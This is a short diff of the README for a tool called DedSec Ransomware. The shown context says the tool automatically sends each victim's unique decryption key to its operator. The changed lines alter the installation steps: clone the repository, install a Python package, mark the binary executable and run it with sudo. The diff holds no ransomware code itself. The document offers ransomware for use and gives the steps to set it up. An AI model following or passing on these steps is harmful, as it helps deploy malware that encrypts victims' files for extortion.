@@ -23,7 +23,8 @@ DedSec Ransomware automatically sends the victim's unique decryption key, along 
 ## INSTALLATION 
     * git clone https://github.com/0xbitx/DEDSEC_RANSOMWARE.git
     * cd DEDSEC_RANSOMWARE
-    * sudo pip3 install pystyle tabulate
+    * sudo pip3 install pystyle
+    * chmod +x dedsec_ransomware
     * sudo ./dedsec_ransomware
 
 ### TESTED ON FOLLOWING
